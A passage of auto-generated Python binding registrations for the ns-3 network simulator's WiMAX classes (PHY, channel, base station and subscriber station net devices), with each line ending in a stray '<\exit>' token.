cls.add_method('NotifyTxDrop',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('NotifyTxEnd',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('Send',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction')])<\exit>
cls.add_method('Send',<\exit>
'void',<\exit>
[param('ns3::SendParams *', 'params')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'BW')])<\exit>
cls.add_method('SetNoiseFigure',<\exit>
'void',<\exit>
[param('double', 'nf')])<\exit>
cls.add_method('SetReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::PacketBurst >, ns3::Ptr< ns3::WimaxConnection >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])<\exit>
cls.add_method('SetSNRToBlockErrorRateTracesPath',<\exit>
'void',<\exit>
[param('char *', 'tracesPath')])<\exit>
cls.add_method('SetTxPower',<\exit>
'void',<\exit>
[param('double', 'txPower')])<\exit>
cls.add_method('StartReceive',<\exit>
'void',<\exit>
[param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPower'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetDataRate',<\exit>
'uint32_t',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetFrameDuration',<\exit>
'ns3::Time',<\exit>
[param('uint8_t', 'frameDurationCode')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetFrameDurationCode',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetGValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNfft',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNrBytes',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNrSymbols',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetRtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetSamplingFactor',<\exit>
'double',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetSamplingFrequency',<\exit>
'double',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetTransmissionTime',<\exit>
'ns3::Time',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetTtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSetDataRates',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSetPhyParameters',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3TimeChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TimeChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3TimeValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TimeValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Time const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Time const &', 'value')])<\exit>
return<\exit>
def register_Ns3TypeIdChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TypeIdChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3TypeIdValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TypeIdValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::TypeId const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::TypeId const &', 'value')])<\exit>
return<\exit>
def register_Ns3UintegerValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::UintegerValue const &', 'arg0')])<\exit>
cls.add_constructor([param('uint64_t const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('uint64_t const &', 'value')])<\exit>
return<\exit>
def register_Ns3WimaxChannel_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxChannel const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Attach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])<\exit>
cls.add_method('GetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetNDevices',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('DoAttach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNDevices',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3WimaxNetDevice_methods(root_module, cls):<\exit>
cls.add_static_attribute('m_direction', 'uint8_t', is_const=False)<\exit>
cls.add_static_attribute('m_frameStartTime', 'ns3::Time', is_const=False)<\exit>
cls.add_instance_attribute('m_traceRx', 'ns3::TracedCallback< ns3::Ptr< ns3::Packet const >, ns3::Mac48Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', is_const=False)<\exit>
cls.add_instance_attribute('m_traceTx', 'ns3::TracedCallback< ns3::Ptr< ns3::Packet const >, ns3::Mac48Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', is_const=False)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetTtg',<\exit>
'void',<\exit>
[param('uint16_t', 'ttg')])<\exit>
cls.add_method('GetTtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetRtg',<\exit>
'void',<\exit>
[param('uint16_t', 'rtg')])<\exit>
cls.add_method('GetRtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Attach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')])<\exit>
cls.add_method('SetPhy',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])<\exit>
cls.add_method('GetPhy',<\exit>
'ns3::Ptr< ns3::WimaxPhy >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetChannel',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxChannel >', 'wimaxChannel')])<\exit>
cls.add_method('GetChannel',<\exit>
'uint64_t',<\exit>
[param('uint8_t', 'index')],<\exit>
is_const=True)<\exit>
cls.add_method('SetNrFrames',<\exit>
'void',<\exit>
[param('uint32_t', 'nrFrames')])<\exit>
cls.add_method('GetNrFrames',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMacAddress',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'address')])<\exit>
cls.add_method('GetMacAddress',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetState',<\exit>
'void',<\exit>
[param('uint8_t', 'state')])<\exit>
cls.add_method('GetState',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInitialRangingConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBroadcastConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetCurrentDcd',<\exit>
'void',<\exit>
[param('ns3::Dcd', 'dcd')])<\exit>
cls.add_method('GetCurrentDcd',<\exit>
'ns3::Dcd',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetCurrentUcd',<\exit>
'void',<\exit>
[param('ns3::Ucd', 'ucd')])<\exit>
cls.add_method('GetCurrentUcd',<\exit>
'ns3::Ucd',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConnectionManager',<\exit>
'ns3::Ptr< ns3::ConnectionManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetConnectionManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::ConnectionManager >', 'connectionManager')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetBurstProfileManager',<\exit>
'ns3::Ptr< ns3::BurstProfileManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBurstProfileManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BurstProfileManager >', 'burstProfileManager')])<\exit>
cls.add_method('GetBandwidthManager',<\exit>
'ns3::Ptr< ns3::BandwidthManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBandwidthManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BandwidthManager >', 'bandwidthManager')])<\exit>
cls.add_method('CreateDefaultConnections',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Start',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('Stop',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetReceiveCallback',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('ForwardUp',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest')])<\exit>
cls.add_method('Enqueue',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('ForwardDown',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('SetName',<\exit>
'void',<\exit>
[param('std::string const', 'name')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetIfIndex',<\exit>
'void',<\exit>
[param('uint32_t const', 'index')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetIfIndex',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetPhyChannel',<\exit>
'ns3::Ptr< ns3::Channel >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetChannel',<\exit>
'ns3::Ptr< ns3::Channel >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetAddress',<\exit>
'void',<\exit>
[param('ns3::Address', 'address')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetAddress',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetMtu',<\exit>
'bool',<\exit>
[param('uint16_t const', 'mtu')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetMtu',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('IsLinkUp',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetLinkChangeCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],<\exit>
is_virtual=True)<\exit>
cls.add_method('IsBroadcast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetBroadcast',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('IsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('MakeMulticastAddress',<\exit>
'ns3::Address',<\exit>
[param('ns3::Ipv4Address', 'multicastGroup')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('IsPointToPoint',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Send',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetNode',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Node >', 'node')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetNode',<\exit>
'ns3::Ptr< ns3::Node >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('NeedsArp',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'cb')],<\exit>
is_virtual=True)<\exit>
cls.add_method('AddLinkChangeCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SendFrom',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'source'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetPromiscReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'cb')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetPromiscReceiveCallback',<\exit>
'ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >',<\exit>
[])<\exit>
cls.add_method('SupportsSendFrom',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Address',<\exit>
[param('ns3::Ipv6Address', 'addr')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Address',<\exit>
[param('ns3::Ipv4Address', 'multicastGroup')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('IsBridge',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('IsPromisc',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('NotifyPromiscTrace',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'p')])<\exit>
cls.add_method('DoSend',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoReceive',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetChannel',<\exit>
'ns3::Ptr< ns3::WimaxChannel >',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3AddressChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::AddressChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3AddressValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::AddressValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Address const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Address const &', 'value')])<\exit>
return<\exit>
def register_Ns3BaseStationNetDevice_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'node'), param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'node'), param('ns3::Ptr< ns3::WimaxPhy >', 'phy'), param('ns3::Ptr< ns3::UplinkScheduler >', 'uplinkScheduler'), param('ns3::Ptr< ns3::BSScheduler >', 'bsScheduler')])<\exit>
cls.add_method('SetInitialRangingInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'initialRangInterval')])<\exit>
cls.add_method('InitBaseStationNetDevice',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('GetInitialRangingInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetDcdInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'dcdInterval')])<\exit>
cls.add_method('GetDcdInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetUcdInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'ucdInterval')])<\exit>
cls.add_method('GetUcdInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT8',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval')])<\exit>
cls.add_method('GetIntervalT8',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMaxRangingCorrectionRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'maxRangCorrectionRetries')])<\exit>
cls.add_method('GetMaxRangingCorrectionRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMaxInvitedRangRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'maxInvitedRangRetries')])<\exit>
cls.add_method('GetMaxInvitedRangRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetRangReqOppSize',<\exit>
'void',<\exit>
[param('uint8_t', 'rangReqOppSize')])<\exit>
cls.add_method('GetRangReqOppSize',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBwReqOppSize',<\exit>
'void',<\exit>
[param('uint8_t', 'bwReqOppSize')])<\exit>
cls.add_method('GetBwReqOppSize',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetNrDlSymbols',<\exit>
'void',<\exit>
[param('uint32_t', 'dlSymbols')])<\exit>
cls.add_method('GetNrDlSymbols',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetNrUlSymbols',<\exit>
'void',<\exit>
[param('uint32_t', 'ulSymbols')])<\exit>
cls.add_method('GetNrUlSymbols',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrDcdSent',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrUcdSent',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlSubframeStartTime',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUlSubframeStartTime',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangingOppNumber',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSSManager',<\exit>
'ns3::Ptr< ns3::SSManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetSSManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::SSManager >', 'ssManager')])<\exit>
cls.add_method('GetUplinkScheduler',<\exit>
'ns3::Ptr< ns3::UplinkScheduler >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetUplinkScheduler',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::UplinkScheduler >', 'ulScheduler')])<\exit>
cls.add_method('GetLinkManager',<\exit>
'ns3::Ptr< ns3::BSLinkManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBSScheduler',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BSScheduler >', 'bsSchedule')])<\exit>
cls.add_method('GetBSScheduler',<\exit>
'ns3::Ptr< ns3::BSScheduler >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetLinkManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BSLinkManager >', 'linkManager')])<\exit>
cls.add_method('GetBsClassifier',<\exit>
'ns3::Ptr< ns3::IpcsClassifier >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBsClassifier',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::IpcsClassifier >', 'classifier')])<\exit>
cls.add_method('GetPsDuration',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSymbolDuration',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Start',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('Stop',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('Enqueue',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('MarkUplinkAllocations',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('MarkRangingOppStart',<\exit>
'void',<\exit>
[param('ns3::Time', 'rangingOppStartTime')])<\exit>
cls.add_method('GetServiceFlowManager',<\exit>
'ns3::Ptr< ns3::BsServiceFlowManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetServiceFlowManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BsServiceFlowManager >', 'arg0')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSend',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoReceive',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet')],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3SimpleOfdmWimaxChannel_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SimpleOfdmWimaxChannel const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::SimpleOfdmWimaxChannel::PropModel', 'propModel')])<\exit>
cls.add_method('Send',<\exit>
'void',<\exit>
[param('ns3::Time', 'BlockTime'), param('uint32_t', 'burstSize'), param('ns3::Ptr< ns3::WimaxPhy >', 'phy'), param('bool', 'isFirstBlock'), param('bool', 'isLastBlock'), param('uint64_t', 'frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('SetPropagationModel',<\exit>
'void',<\exit>
[param('ns3::SimpleOfdmWimaxChannel::PropModel', 'propModel')])<\exit>
cls.add_method('DoAttach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNDevices',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3SubscriberStationNetDevice_methods(root_module, cls):<\exit>
cls.add_instance_attribute('m_linkManager', 'ns3::Ptr< ns3::SSLinkManager >', is_const=False)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'arg0'), param('ns3::Ptr< ns3::WimaxPhy >', 'arg1')])<\exit>
cls.add_method('InitSubscriberStationNetDevice',<\exit>
'void',<\exit>
[])<\exit>
